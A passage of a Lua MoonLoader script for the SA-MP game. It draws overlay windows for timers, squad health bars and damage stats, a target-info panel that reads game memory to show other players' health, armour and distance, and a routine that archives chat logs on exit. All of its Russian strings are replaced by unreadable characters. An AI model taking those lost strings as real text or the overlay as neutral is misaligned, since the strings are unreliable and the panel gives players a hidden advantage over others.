										local rsc = math.fmod(RKTo, 60) >= 10 and math.fmod(RKTo, 60) or "0" .. math.fmod(RKTo, 60) .. ""
										rtm = "" .. rmn ..":" .. rsc .. ""
								else
										rtm = "0:00"
										RKTimerTickCount = nil
										local bass = require "lib.bass" -- ��������� ������
										local radio = bass.BASS_StreamCreateFile(false, "moonloader\\Sounds\\s.wav", 0, 0, 0)
										bass.BASS_ChannelSetAttribute(radio, BASS_ATTRIB_VOL, 0.5) -- ���������
										bass.BASS_ChannelPlay(radio, false) -- �������������
										sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �����. ����� ������������.", 0xFFFF0000)
								end
						end

						if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_rkX, config_ini.ovCoords.show_rkY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_rkX, config_ini.ovCoords.show_rkY)) end end
						rtm = SetMode and "2:52" or rtm
						imgui.Begin('#empty_field5', show.show_rk, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFont)
						imgui.TextColoredRGB('{FFFAFA}' .. rtm .. '')
						imgui.PopFont()
						s_coord["s_rk"] = imgui.GetWindowPos()
						imgui.End()
				end

				if (config_ini.bools[53] == 1 and BKTimerTickCount ~= nil) or SetMode then
					local rtm = nil
					if not SetMode then
							local RKTo = 35 - (os.time() - BKTimerTickCount)
							if RKTo > 0 then
									local rmn = math.floor(RKTo / 60)
									local rsc = math.fmod(RKTo, 60) >= 10 and math.fmod(RKTo, 60) or "0" .. math.fmod(RKTo, 60) .. ""
									rtm = "" .. rmn ..":" .. rsc .. ""
							else
									rtm = "0:00"
									BKTimerTickCount = nil
							end
					end

					if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_deathX, config_ini.ovCoords.show_deathY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_deathX, config_ini.ovCoords.show_deathY)) end end
					rtm = SetMode and "0:21" or rtm
					imgui.Begin('#empty_field43', show.show_death, 1 + 32 + 2 + SetModeCond + 64)
					imgui.PushFont(imfonts.exFont)
					imgui.TextColoredRGB('{FFFAFA}' .. rtm .. '')
					imgui.PopFont()
					s_coord["s_death"] = imgui.GetWindowPos()
					imgui.End()
				end

				if (config_ini.bools[30] == 1 and afkstatus) or SetMode then
						if not SetMode then 	imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_afkX, config_ini.ovCoords.show_afkY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_afkX, config_ini.ovCoords.show_afkY)) end end
						imgui.Begin('#empty_field9', show.show_afk, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFont)
						imgui.TextColoredRGB('{00FF00}AFK')
						imgui.PopFont()
						s_coord["s_afk"] = imgui.GetWindowPos()
						imgui.End()
				end

				if config_ini.bools[33] == 1 then
						if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_tecinfoX, config_ini.ovCoords.show_tecinfoY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_tecinfoX, config_ini.ovCoords.show_tecinfoY)) end end
						imgui.Begin('#empty_field14', show.show_tecinfo, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFontl)
							local imlej = SetMode and "231, 412, 999" or lastID.e
						if imlej ~= "none" then imgui.TextColoredRGB('ID ����. ��. ������ (lej): ' .. imlej .. '') end
							local immkv = SetMode and "A-12" or lastKV.m
						if immkv ~= "none" then imgui.TextColoredRGB('����. ��. ����. ��������� (mkv): ' .. immkv .. '') end
							local imbkv = SetMode and "�-14" or lastKV.b
						if imbkv ~= "none" then imgui.TextColoredRGB('����. ��. ����. ����� (bkv): ' .. imbkv .. '') end
							local pedskol = 0
							for k, v in ipairs(getAllChars()) do local res, id = sampGetPlayerIdByCharHandle(v) if res and not sampIsPlayerNpc(id) and v ~= PLAYER_PED then pedskol = pedskol + 1 end end
						imgui.TextColoredRGB('���������� ���������� � ����������: ' .. pedskol .. '')
						--print(CTaskArr["CurrentID"], CTaskArr[1][CTaskArr["CurrentID"]])
						local CStatus = (CTaskArr["CurrentID"] == 0) and "{FFFAFA}�������� �������" or "" .. CTaskArr["n"][CTaskArr[1][CTaskArr["CurrentID"]]] .. " " .. (indexof(CTaskArr[1][CTaskArr["CurrentID"]], CTaskArr["nn"]) ~= false and CTaskArr[3][CTaskArr["CurrentID"]] or "") .. ""
						imgui.TextColoredRGB('������ ����������� �������: ' .. CStatus .. '')
						s_coord["s_tecinfo"] = imgui.GetWindowPos()
						imgui.PopFont()
						imgui.End()
				end

				if config_ini.bools[37] == 1 and sampIsChatInputActive() then
						local in1 = sampGetInputInfoPtr()
			      local in1_1 = getStructElement(in1, 0x8, 4)
			      local in2 = getStructElement(--[[int]] in1_1, --[[int]] 0x8, --[[int]] 4)
			      local in3 = getStructElement(--[[int]] in1_1, --[[int]] 0xC, --[[int]] 4)
			      local fib = in3 + 40
			      local fib2 = in2 + 5
					  local success = ffi.C.GetKeyboardLayoutNameA(keybbb.KeyboardLayoutName)
					  local errorCode = ffi.C.GetLocaleInfoA(tonumber(ffi.string(keybbb.KeyboardLayoutName), 16), 0x00000002, keybbb.LocalInfo, 32)
					  local localName = ffi.string(keybbb.LocalInfo)
						local capsState = ffi.C.GetKeyState(20)
						imgui.SetNextWindowPos(imgui.ImVec2(fib2, fib))
						imgui.Begin('#empty_field37', show.show_keyb, 1 + 32 + 2 + SetModeCond + 64)
						imgui.TextColoredRGB("���������: {ffffff}" .. localName .. "; CAPS:" .. getStrByState(capsState) .. "")
						imgui.End()
				end
				
				if config_ini.bools[41] == 1 and (rCache.enable or SetMode) and not sampIsChatInputActive() then
					if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_squadX, config_ini.ovCoords.show_squadY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_squadX, config_ini.ovCoords.show_squadY)) end end
					imgui.Begin('#empty_field37', show.show_squad, 1 + 32 + 2 + SetModeCond + 64)
					imgui.PushFont(imfonts.exFontsquad)
					imgui.TextColoredRGB("{" .. config_ini.squadset[1] .. "}������ ������")
					s_coord["s_squad"] = imgui.GetWindowPos()					
					imgui.PopFont()
					imgui.End()

					if not SetMode then
						local tkeys = {}
						-- populate the table that holds the keys
						for k in pairs(rCache.smem) do table.insert(tkeys, k) end
						-- sort the keys
						table.sort(tkeys)
						local A_Index = 1
						for a, k in ipairs(tkeys) do
							if k ~= nil then
								local v = rCache.smem[k]
								local sqcol
								local HP
								local ARM
								if sampGetCharHandleBySampPlayerId(k) then
									sqcol = v.color
									ARM = sampGetPlayerArmor(k)
									HP = sampGetPlayerHealth(k)
								else
									sqcol = v.colorns
									ARM = 0
									HP = 0
								end
								
								local afk = (v.time ~= 0 and v.time + 30 <= os.time()) and "{008000} AFK: " .. (os.time() - v.time) .. "" or "" 
								local x, y = s_coord["s_squad"].x + 5, s_coord["s_squad"].y + (25 * A_Index)
								renderFontDrawText(imfonts.exFontsquadrender, "" .. v.name .. " [" .. k .. "]" .. afk .. "", x, y, sqcol)
							--	imgui.TextColoredRGB("{" .. sqcol .. "}" .. v.name .. " [" .. k .. "]" .. afk .. "")
								renderDrawLine(x + 2, y + 22, x + 90, y + 22, 5.0, 0xFF808080)
								renderDrawLine(x + 2 + 100, y + 22, x + 190, y + 22, 5.0, 0xFF808080)
								if k == select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) then
									local myHP = getCharHealth(PLAYER_PED)
									local myARM = getCharArmour(PLAYER_PED)
									if myHP ~= 0 then renderDrawLine(x + 2, y + 22, x + ((90/100) * myHP), y + 22, 5.0, 0xFF800000) end
									if myARM ~= 0 then renderDrawLine(x + 2 + 100, y + 22, x + 100 + ((90/100) * myARM), y + 22, 5.0, 0xFFC0C0C0) end
								else
									if HP ~= 0 then renderDrawLine(x + 2, y + 22, x + ((90/100) * HP), y + 22, 5.0, 0xFF800000) end
									if ARM ~= 0 then renderDrawLine(x + 2 + 100, y + 22, x + 100 + ((90/100) * ARM), y + 22, 5.0, 0xFFC0C0C0) end
								--	colors[clr.PlotHistogram] = imgui.ImVec4(0.7, 0, 0, 1) imgui.ProgressBar(HP / 100, imgui.ImVec2(70, 3.0)) imgui.SameLine() imgui.SwitchContext() colors[clr.PlotHistogram] = imgui.ImVec4(0.9, 0.9, 0.9, 1) imgui.ProgressBar(ARM / 100, imgui.ImVec2(70, 3.0))
								end
								A_Index = A_Index + 1
							end
						end
					else
						local x, y = s_coord["s_squad"].x + 5, s_coord["s_squad"].y + (25 * 1)
						renderFontDrawText(imfonts.exFontsquadrender, "Nya_Arigato [123]{008000} AFK: 231", x, y, -1766653952)
						renderDrawLine(x + 2, y + 20, x + 90, y + 20, 5.0, 0xFF808080)
						renderDrawLine(x + 2 + 100, y + 20, x + 190, y + 20, 5.0, 0xFF808080)
						local x, y = s_coord["s_squad"].x + 5, s_coord["s_squad"].y + (25 * 2)
						renderFontDrawText(imfonts.exFontsquadrender, "Aleksandr_Hacker [231]", x, y, -1766653952)
						renderDrawLine(x + 2, y + 20, x + 90, y + 20, 5.0, 0xFF808080)
						renderDrawLine(x + 2 + 100, y + 20, x + 190, y + 20, 5.0, 0xFF808080)
						local x, y = s_coord["s_squad"].x + 5, s_coord["s_squad"].y + (25 * 3)
						renderFontDrawText(imfonts.exFontsquadrender, "Arman_Soptovskij [222]", x, y, -1766653952)
						renderDrawLine(x + 2 , y + 20, x + 90, y + 20, 5.0, 0xFF808080)
						renderDrawLine(x + 2 + 100, y + 20, x + 190, y + 20, 5.0, 0xFF808080)
						local x, y = s_coord["s_squad"].x + 5, s_coord["s_squad"].y + (25 * 4)
						renderFontDrawText(imfonts.exFontsquadrender, "Vasiliy_Underwood [666]", x, y, -1766653952)
						renderDrawLine(x + 2, y + 20, x + 90, y + 20, 5.0, 0xFF808080)
						renderDrawLine(x + 2 + 100, y + 20, x + 190, y + 20, 5.0, 0xFF808080)
						local x, y = s_coord["s_squad"].x + 5,s_coord["s_squad"].y + (25 * 5)
						renderFontDrawText(imfonts.exFontsquadrender, "Olivia_Flores [111]", x, y, -1766653952)
						renderDrawLine(x + 2, y + 20, x + 90, y + 20, 5.0, 0xFF808080)
						renderDrawLine(x + 2 + 100, y + 20, x + 190, y + 20, 5.0, 0xFF808080)
					end
					
					
				end
				
				if (config_ini.bools[43] == 1 and show.show_500.bool500.v) or SetMode then
					if not SetMode then
						if (os.time() - show.show_500.time500 <= 5) then
							imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_500X, config_ini.ovCoords.show_500Y))
							imgui.Begin('#empty_field39', show.show_500.bool500, 1 + 32 + 2 + SetModeCond + 64)
							imgui.PushFont(imfonts.font500)
							local money = tostring(500 * show.show_500.mult500)
							imgui.TextColoredRGB("{" .. config_ini.plus500[1] .. "}$" .. money .. "")
							imgui.PopFont()
							imgui.End()
						else
							show.show_500.bool500.v = false
							show.show_500.mult500 = 0
						end
					else
						if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_500X, config_ini.ovCoords.show_500Y)) end
						imgui.Begin('#empty_field39', show.show_500.bool500, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.font500)
						imgui.TextColoredRGB("{" .. config_ini.plus500[1] .. "}$1500")
						imgui.PopFont()
						s_coord["s_500"] = imgui.GetWindowPos()
						imgui.End()
					end
				end
				
				if config_ini.bools[44] == 1 then
						if not SetMode then	imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_dindX, config_ini.ovCoords.show_dindY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_dindX, config_ini.ovCoords.show_dindY))	end end
						imgui.Begin('#empty_field40', show.show_dmind.bool, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFont)
						local acc = (show.show_dmind.damind.hits[24] == 0 or show.show_dmind.damind.shots[24] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[24] / (show.show_dmind.damind.shots[24] / 100))
							imgui.Image(images[2], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[24]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						local acc = (show.show_dmind.damind.hits[25] == 0 or show.show_dmind.damind.shots[25] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[25] / (show.show_dmind.damind.shots[25] / 100))
							imgui.Image(images[3], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[25]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						local acc = (show.show_dmind.damind.hits[31] == 0 or show.show_dmind.damind.shots[31] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[31] / (show.show_dmind.damind.shots[31] / 100))
							imgui.Image(images[4], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[31]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						local acc = (show.show_dmind.damind.hits[33] == 0 or show.show_dmind.damind.shots[33] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[33] / (show.show_dmind.damind.shots[33] / 100))
							imgui.Image(images[5], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[33]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						local acc = (show.show_dmind.damind.hits[29] == 0 or show.show_dmind.damind.shots[29] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[29] / (show.show_dmind.damind.shots[29] / 100))
							imgui.Image(images[6], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[29]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						local acc = (show.show_dmind.damind.hits[1] == 0 or show.show_dmind.damind.shots[1] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[1] / (show.show_dmind.damind.shots[1] / 100))
							imgui.Image(images[1], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[1]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						imgui.PopFont()
						s_coord["s_dind"] = imgui.GetWindowPos()
						imgui.End()
				end

				if config_ini.bools[52] == 1 then
					if not SetMode then	imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_damX, config_ini.ovCoords.show_damY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_damX, config_ini.ovCoords.show_damY))	end end
					imgui.Begin('#empty_field41', show.show_dam, 1 + 32 + 2 + SetModeCond + 64)
					imgui.PushFont(imfonts.exFontsquad)
					imgui.TextColoredRGB('{fffafa}���������� ����:')
					for k, v in ipairs(dinf[2].id) do if v ~= -1 then imgui.TextColoredRGB('{' .. dinf[2].clist[k] .. '}' .. dinf[2].nick[k] .. '[' .. v .. '] {fffafa}- ' .. dinf[2].weapon[k] .. ' +' .. dinf[2].damage[k] .. '' .. (dinf[2].kill[k] and "{FF0000} +KILL" or "") .. '') end end
					s_coord["s_dam"] = imgui.GetWindowPos()
					imgui.PopFont()
					imgui.End()

					imgui.SetNextWindowPos(imgui.ImVec2(s_coord["s_dam"].x + 400, s_coord["s_dam"].y))
					imgui.Begin('#empty_field42', show.show_dam, 1 + 32 + 2 + SetModeCond + 64)
					imgui.PushFont(imfonts.exFontsquad)
					imgui.TextColoredRGB('{fffafa}���������� ����:')
					for k, v in ipairs(dinf[1].id) do if v ~= -1 then imgui.TextColoredRGB('{' .. dinf[1].clist[k] .. '}' .. dinf[1].nick[k] .. '[' .. v .. '] {fffafa}- ' .. dinf[1].weapon[k] .. ' -' .. dinf[1].damage[k] .. '' .. (dinf[1].kill[k] and "{FF0000} -KILL" or "") .. '') end end
					imgui.PopFont()
					imgui.End()
				end

				if config_ini.bools[58] == 1 then
					if not SetMode then	imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_moneyX, config_ini.ovCoords.show_moneyY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_moneyX, config_ini.ovCoords.show_moneyY))	end end
					imgui.SetNextWindowSize(imgui.ImVec2(config_ini.ovCoords.show_moneyX, config_ini.ovCoords.show_moneyY), imgui.Cond.Always)
					imgui.Begin("#empty_field44", show.show_fond, 1 + 32 + 2 + SetModeCond + 64)
					imgui.PushFont(imfonts.fontmoney)
					local m1 = tonumber(fond[1])
					local m2 = tonumber(fond[2])
					imgui.TextColoredRGB("{" .. config_ini.fondset[1] .. "}$" .. fond[1] .. "")
					imgui.TextColoredRGB(m1 == nil and "{" .. config_ini.fondset[2] .. "}$" .. fond[2] .. "" or "{" .. (m2 - m1 < 0 and "FF0000" or "" .. config_ini.fondset[2] .. "") .. "}$" .. tostring(math.floor(m2)-m1) .. "")
					s_coord["s_money"] = imgui.GetWindowPos()
					imgui.PopFont()
					imgui.End()
				end

				SetModeFirstShow = false
		--end
end

function targetinfo()
	local SetModeCond = SetMode and 0 or 4
	local crsX, crsY, crsZ = convertScreenCoordsToWorld3D(sx, sy, 700.0)
						local myX, myY, myZ = getCharCoordinates(PLAYER_PED)
						local camX, camY, camZ = getActiveCameraCoordinates()
						local result, colpoint = processLineOfSight(camX, camY, camZ, crsX, crsY, crsZ, true, true, true, true, false, false, true, true)
						local hcar
						if result or SetMode then
								-- ���������� � ������ � �������
							if not SetMode then
								if colpoint.entityType == 2 and doesVehicleExist(getVehiclePointerHandle(colpoint.entity)) then -- ����������� � ������ � �������
									hcar = getVehiclePointerHandle(colpoint.entity)
								else -- ����� ������ ������ �������
									local car_cx = representIntAsFloat(readMemory(0xB6EC10, 4, false))
									local car_cy = representIntAsFloat(readMemory(0xB6EC14, 4, false))
									local car_w, car_h = getScreenResolution()
									local car_xc, car_yc = car_w * car_cy, car_h * car_cx

									local minDist = ((car_w / 2) / getCameraFov()) * 10
									local closestCarId, closestCarhandle = -1, -1
									local carhandles = getcars()
									if carhandles ~= nil then
										for k, v in pairs(carhandles) do
											if doesVehicleExist(v) and isCarOnScreen(v) then
												local idcar = getCarModel(v)
												local myX, myY, myZ = getCharCoordinates(PLAYER_PED)
												local cX, cY, cZ = getCarCoordinates(v)
												local distanse = math.ceil(math.sqrt( ((myX-cX)^2) + ((myY-cY)^2) + ((myZ-cZ)^2)))
												if distanse < 300 then
													local car_xi, car_yi = convert3DCoordsToScreen(cX, cY, cZ)
													local dist = math.sqrt( (car_xi - car_xc) ^ 2 + (car_yi - car_yc) ^ 2 )
													if dist < minDist then
														minDist = dist		
														if isLineOfSightClear(myX, myY, myZ, cX, cY, cZ, true, false, false, true, false) then hcar = v	break end
													end
												end
											end
										end
									end
								end
								
								if hcar ~= nil then -- ���� ������ �������
									local motos = {[522] = "NRG-500", [463] = "Freeway", [461] = "PCJ-600", [581] = "BF-400", [521] = "FCR-900"}
									local carX, carY, carZ = getCarCoordinates(hcar)
									local cardist = math.ceil(math.sqrt( ((myX-carX)^2) + ((myY-carY)^2) + ((myZ-carZ)^2)))
									local cidcar = getCarModel(hcar)
									local ccHP = getCarHealth(hcar)
									local ccol = ccHP > 800 and "00FF00" or ccHP > 500 and "FFFF00" or "FF0000"
									local doorStatus = getCarDoorLockStatus(hcar) == 2 and "{ff0000}�������" or "{00ff00}�������"
									local tirestatus = motos[cidcar] ~= nil and isCarTireBurst(hcar, 1) and "; {FF0000}������� ������ ������" or ""
									local cresult2, cid = sampGetVehicleIdByCarHandle(hcar)
									local dist = getshotdist(hcar)
									
									local fcar
									if cIDs[cid] ~= nil then
										fcar = cIDs[cid]
									else
										fcar =  "CID: " .. cid .. ""
									end
									
									if cresult2 then
										lastcarhandle = hcar
										imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.crosCarX, config_ini.ovCoords.crosCarY))
										imgui.Begin('#empty_field16', show.show_target, 1 + 32 + 2 + SetModeCond + 64)
										imgui.PushFont(imfonts.exFontl)
										imgui.TextColoredRGB("{FFFAFA}���: " .. tVehicleNames[cidcar-399] .. "[" .. cidcar .. "]; ��������: {" .. ccol .. "}" .. ccHP .. "; {FFFAFA}" .. fcar .. "")
										imgui.TextColoredRGB("" .. dist .. " �. " .. tirestatus .. "")
										s_coord["s_targetCar"] = imgui.GetWindowPos()
										imgui.PopFont()
										imgui.End()
									else
										lastcarhandle = nil
									end
									
									--if not SetMode and isKeyDown(0x12) and not piearr.reportpie.action and not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA} �������� ��������� " .. tVehicleNames[cidcar-399] .. "[" .. cidcar .. "], " .. fcar .. "", 0xFFFFFAFA) piearr.reportpie.handle = hcar piearr.reportpie.mode = 2 piearr.reportpie.pie_mode.v = true imgui.ShowCursor = true piearr.reportpie.action = true else piearr.reportpie.pie_mode.v = false imgui.ShowCursor = false piearr.reportpie.action = false end
								end
							else
								if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.crosCarX, config_ini.ovCoords.crosCarY)) end
								imgui.Begin('#empty_field16', show.show_target, 1 + 32 + 2 + SetModeCond + 64)
								imgui.PushFont(imfonts.exFontl)
								imgui.TextColoredRGB("{FFFAFA}���: NRG-500[522]; {FFFAFA}��������: {FFFF00}600; {fffafa}����� ��")
								imgui.TextColoredRGB("{00ff00}����������: 120/200 �. {ff0000}������� ������ ������")
								s_coord["s_targetCar"] = imgui.GetWindowPos()
								imgui.PopFont()
								imgui.End()
							end

							local suct = false
							local tped
							if not SetMode then
								if colpoint.entityType == 3 and doesCharExist(getCharPointerHandle(colpoint.entity)) then
									tped = getCharPointerHandle(colpoint.entity)
									if tped ~= PLAYER_PED then
										target.id = select(2, sampGetPlayerIdByCharHandle(tped))
										target.time = os.clock()
										target.suct = true
									end
								else
									if target.id ~= 1000 then 
										if target.time + 1.5 > os.clock() then
											local res, tar = sampGetCharHandleBySampPlayerId(target.id)
											if res then
												local tX, tY, tZ = getCharCoordinates(tar)
												local result2, colpoint2 = processLineOfSight(camX, camY, camZ, tX, tY, tZ, true, true, true, true, true, true, true, true)
												if result2 then
													if colpoint2.entityType == 3 then
														local ped = getCharPointerHandle(colpoint2.entity)
														if doesCharExist(ped) and ped == tar then 
															target.suct = true 
															tped = tar 
														end
													else
														target.suct = false
														target.id = 1000 
														target.time = 0
													end
												end
											else 
												target.suct = false
												target.id = 1000 
												target.time = 0 
													
											end
										else
											target.suct = false
											target.id = 1000
											target.time = 0	
										end
									else
										target.suct = false
									end
								end
							else
								target.suct = true
							end

							if target.suct then
								local result, id
								if not SetMode then result, id = sampGetPlayerIdByCharHandle(tped) else result = true end
								if result and id ~= select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) then -- ���������, ������ �� ��������� ��� �������
									lastTargetID = id
									local myX, myY, myZ, tX, tY, tZ
									if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_targetImageX, config_ini.ovCoords.show_targetImageY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_targetImageX, config_ini.ovCoords.show_targetImageY)) end end
									imgui.Begin('#empty_field10', show.show_target, 1 + 32 + 2 + SetModeCond + 64)
									imgui.Image(images[16], imgui.ImVec2(800, 193))
									s_coord["s_target"] = imgui.GetWindowPos()
									imgui.End()

									local str1coorX = s_coord["s_target"].x + 75
									local str1coorY = s_coord["s_target"].y - 20
									local curdistanse, wID, weapdist
									local fARM, fHP, tName, hpcol, mwID
									imgui.SetNextWindowPos(imgui.ImVec2(str1coorX, str1coorY))
									imgui.Begin('#empty_field11', show.show_target, 1 + 32 + 2 + 4 + 64)
									if not SetMode then
										fARM = sampGetPlayerArmor(id)
										fHP = sampGetPlayerHealth(id)
										tName = sampGetPlayerNickname(id)
										mwID = tonumber(getCurrentCharWeapon(PLAYER_PED))
										local myDmg = tweapondamage[mwID] ~= nil and tweapondamage[mwID] or 1
										if myDmg == 0 then
											hpcol = (fHP + fARM) >= 100 and "{00FF00}" or (fHP + fARM) <= 30 and "{FF0000}" or "{FFFF00}"
										else
											local shcolhp = math.ceil((fARM + fHP)/ myDmg)
											if mwID == 24 or mwID == 25 or mwID == 33 then
												hpcol = shcolhp <= 1 and "{FF0000}" or shcolhp <= 2 and "{FFFF00}" or "{00FF00}"
											elseif mwID == 23 or mwID == 29 or mwID == 30 or mwID == 31 then
												hpcol = shcolhp <= 3 and "{FF0000}" or shcolhp <= 5 and "{FFFF00}" or "{00FF00}"
											else
												hpcol = (fHP + fARM) >= 100 and "{00FF00}" or (fHP + fARM) <= 30 and "{FF0000}" or "{FFFF00}"
											end
										end
									else
										tName = "Vasya_Pupkin"
										id = 231
										fHP = 100
										fARM = 16
										hpcol = "{00FF00}"
									end

									if not SetMode then
										local myX, myY, myZ = getCharCoordinates(PLAYER_PED)
										local tX, tY, tZ = getCharCoordinates(tped)
										curdistanse = math.ceil(math.sqrt( ((myX-tX)^2) + ((myY-tY)^2) + ((myZ-tZ)^2)))
										wID = tonumber(getCurrentCharWeapon(tped))
										weapdist = tweapondist[mwID] ~= nil and tweapondist[mwID] or 0
									else
										curdistanse = 92
										wID = 24
										weapdist = 50
									end

									if curdistanse > 22 then 
										fHP, fARM = "����������", "����������"
										if (curdistanse <= 55 and mwID == 33) or (curdistanse <= 50 and (mwID == 30 or mwID == 31)) or (curdistanse <= 35) then else hpcol = "{FFFAFA}" end
									end

									imgui.PushFont(imfonts.exFont)
									imgui.TextColoredRGB('{FFFAFA}' .. hpcol .. '�������� ����: ' .. fHP .. ' ����� ����: ' .. fARM .. '')
									imgui.PopFont()
									imgui.End()

									local str2coorX = s_coord["s_target"].x + 21
									local str2coorY = s_coord["s_target"].y + 148
									imgui.SetNextWindowPos(imgui.ImVec2(str2coorX, str2coorY))
									imgui.Begin('#empty_field12', show_target, 1 + 32 + 2 + 4 + 64)

									imgui.PushFont(imfonts.exFont)
									imgui.TextColoredRGB('{FFFAFA}���������: ' .. curdistanse .. '/' .. weapdist .. ' �. ������: ' .. returnWeapDistCol(wID, curdistanse) .. '' .. tweaponNames[wID] .. '')
									imgui.PopFont()
									imgui.End()
									
									--if not SetMode and isKeyDown(0x12) and not piearr.reportpie.action and not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA} �������� ��������� " .. sampGetPlayerNickname(id) .. "[" .. id .. "], " .. curdistanse .. " �.", 0xFFFFFAFA) piearr.reportpie.handle = tped piearr.reportpie.mode = 1 piearr.reportpie.pie_mode.v = true imgui.ShowCursor = true piearr.reportpie.action = true else piearr.reportpie.pie_mode.v = false imgui.ShowCursor = false piearr.reportpie.action = false end
								end
							end
						end
end

function onQuitGame()
	-- ��������� ������
	local arr = {[1] = "������", [2] = "�������", [3] = "����", [4] = "������", [5] = "���", [6] = "����", [7] = "����", [8] = "������", [9] = "��������", [10] = "�������", [11] = "������", [12] = "�������"}
	local m = arr[tonumber(os.date("%m"):match("0?(%d+)"))]
	local y = os.date("%Y")

	lfs.chdir("" .. getWorkingDirectory() .. "\\Chatlogs")
	if not isDir("" .. getWorkingDirectory() .. "\\Chatlogs\\" .. y .. "") then lfs.mkdir(y) end
	lfs.chdir("" .. getWorkingDirectory() .. "\\Chatlogs\\" .. y .. "")
	if not isDir("" .. getWorkingDirectory() .. "\\Chatlogs\\" .. y .. "\\" .. m .. "") then lfs.mkdir(m) end

	print("Saving chatlog...")
	local path_log = memory.tostring(sampGetBase() + 0x219F88) .. "\\chatlog.txt"
	local saved_log = "" .. getWorkingDirectory() .. "\\Chatlogs\\" .. y .. "\\" .. m .. "\\" .. os.date("%d.%m.%y") .. ".txt"
	local chatlog = io.open(path_log, "r")
	local chatlog_text = chatlog:read("*a")
	chatlog:close()

	local chatlog_new = io.open(saved_log, "a")
	chatlog_new:write("" .. chatlog_text .."\n############################################################################������ ����������� � " .. os.date("%d.%m.%y %X") .. "############################################################################\n")
	chatlog_new:close()
	print("Saved.")
end

function onScriptTerminate(s, bool)
	if s == thisScript() and not bool then
		print("#PathForReload " .. thisScript().path .. " @#")
		for i = 0, 1000 do if sampIs3dTextDefined(2048 - i) then sampDestroy3dText(2048 - i) end end
		if not isobnova then sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}������ ��������. ������� ��������� �� ������ � �������� ������������. ������� CTRL + R ��� �����������.", 0xFFFF0000) end
	end
	
end

function onWindowMessage(msg, wparam, lparam)
	if (show.show_mem1.v or show.show_otm.v or show.show_lek.v) and (msg == 0x100 or msg == 0x101) and wparam == vkeys.VK_ESCAPE then consumeWindowMessage(true, false) if(msg == 0x101) then show.show_lek.v = false show.show_mem1.v = false show.show_otm.v = false end end

	if lparam == 0xFFF and waitforsave then
		waitforsave = false
		local res_log = "" .. getWorkingDirectory() .. "\\POST_response.txt"
		local res = io.open(res_log, "r")
		local responsetext = res:read("*a")
		res:close()
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. (responsetext:match("@@.@ Update complete @@..@.@") ~= nil and "������������� ������� � �������� ���������" or "�� ������� ���������������� ������ � ��������") .. "", 0xffFF0000)
	--	os.remove(res_log)
